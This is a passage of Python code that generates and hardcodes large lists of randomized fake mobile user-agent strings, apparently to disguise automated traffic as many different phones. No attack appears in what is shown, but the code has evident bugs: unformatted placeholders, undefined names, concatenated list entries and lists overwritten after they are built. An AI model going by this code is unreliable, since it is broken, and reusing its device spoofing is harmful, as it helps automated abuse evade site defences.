    A7A3  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; Elephone P3000 Build/KTU84P) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/{str(rr(33,199))}.0.{str(rr(1500,2900))}.{str(rr(75,450))} Mobile Safari/536.1"
    A7A4  = "Mozilla/5.0 (Android; Android {str(rr(7,12))}; HUAWEI G{str(rr(2,12))}-L{str(rr(3,12))} Build/HuaweiG{str(rr(7,12))}-L{str(rr(7,12))}) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(2111,4999))}.{str(rr(73,299))} Mobile Safari/533.9"
    A7A5  = "Mozilla/5.0 (Linux; U; Android {str(rr(3,12))}; Samsung Galaxy S4 Mega GT-{str(rr(I4400,I9400))} Build/JDQ{str(rr(21,112))}) AppleWebKit/537.24 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,199))} Mobile Safari/534.0"
    A7A6  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,12))}_{str(rr(3,8))}_0 like Mac OS X) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,399))} Mobile Safari/536.3"
    A7A7  = f"Mozilla/5.0 (Android; Android{str(rr(4,12))}; MOTOROLA MOTO XT{str(rr(1300,1580))} Build/LXB{str(rr(10,25))}) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/537.36"
    A7A8  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,16))}_{str(rr(4,22))}_{str(rr(4,12))} like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/534.6"
    UserAgentss = str(rc([A7A,A7A1,A7A2,A7A3,A7A4,A7A5,A7A6,A7A7,A7A8]))
    ugen.append(UserAgentss)
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
        

ugen = ['Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gbaMozilla/5.0 (Symbian/3; Series60/5.4 Nokia808PureView/112.020.0309; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.22 Mobile Safari/535.1 3gpp-gbaMozilla/5.0 (BlackBerry; U; BlackBerry 9320; nl) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.714 Mobile Safari/534.11+Mozilla/5.0 (Linux; Android 11.0.0; Huawei Y9 PRIME Build/STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.124 Mobile Safari/537.36Mozilla/5.0 (Symbian/3; Series60/8.1 Nokia547/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/7.2.1.2 Mobile Safari/535.1Mozilla/5.0 (Symbian/3; Series60/5.6 Nokia4403/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.3.3 Mobile Safari/535.1Mozilla/5.0 (Linux; Android 7.1.2; Nokia 1011 Build/NZH54D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbaMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; CPH2271 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.5816.68 UCBrowser/14.8.0.2615 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; CPH2271 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.5816.68 UCBrowser/14.8.0.2615 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; N9208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.6651.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; CPH2271 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.5816.68 UCBrowser/14.8.0.2615 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; N9208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.6651.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.4091.335 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; CPH2271 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.5816.68 UCBrowser/14.8.0.2615 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; N9208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.6651.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.4091.335 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2101K9AG ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2892.133 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; CPH2271 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.5816.68 UCBrowser/14.8.0.2615 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; N9208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.6651.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.4091.335 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; M2101K9AG ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2892.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; M2102K1AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.556.380 Mobile Safari/537.36']

ugen1 = ['Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 21121119SG Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4713.25 UCBrowser/7.7.0.2069 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 21121119SG Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4713.25 UCBrowser/7.7.0.2069 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2492.324 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 21121119SG Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4713.25 UCBrowser/7.7.0.2069 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2492.324 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; X559F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1597.88 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 21121119SG Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4713.25 UCBrowser/7.7.0.2069 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2492.324 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; X559F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1597.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; CPH2209 Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/26.0.1427.33 UCBrowser/15.1.0.5036 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.4618.207 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 21121119SG Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4713.25 UCBrowser/7.7.0.2069 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2492.324 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; X559F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1597.88 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; CPH2209 Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/26.0.1427.33 UCBrowser/15.1.0.5036 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2105K81AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.3556.218 Mobile Safari/537.36']

ugen2 = ['Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2864.351 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2864.351 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5824.344 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2864.351 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5824.344 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2083 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.1716.49 UCBrowser/6.9.0.1011 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2864.351 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5824.344 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2083 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.1716.49 UCBrowser/6.9.0.1011 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G885Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4750.223 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6; X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.4671.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A405FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2864.351 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.5824.344 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2083 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.1716.49 UCBrowser/6.9.0.1011 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G885Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.4750.223 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4256.115 Mobile Safari/537.36']

ugen3 = ['Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.3140.156 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.3140.156 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1229.325 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.3140.156 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1229.325 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4330.135 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.3140.156 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1229.325 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4330.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X659B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.888.377 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; A022M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1891.177 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.3140.156 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1229.325 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4330.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X659B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.888.377 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; GT-S7500ABTTLP) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4675.62 Mobile Safari/537.36']

ugen4 = ['Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; N930P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2195.130 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; N930P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2195.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH2013 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.2463.55 UCBrowser/13.7.0.895 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; N930P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2195.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH2013 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.2463.55 UCBrowser/13.7.0.895 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH1827 Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.6370.307 UCBrowser/1.1.0.570 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; N930P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2195.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH2013 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.2463.55 UCBrowser/13.7.0.895 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH1827 Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.6370.307 UCBrowser/1.1.0.570 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2371 Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3951.294 UCBrowser/4.7.0.3001 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; GT-S5312L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4598.135 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/19.0.1782.10 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; G3502I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.6026.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3MII Build/J) 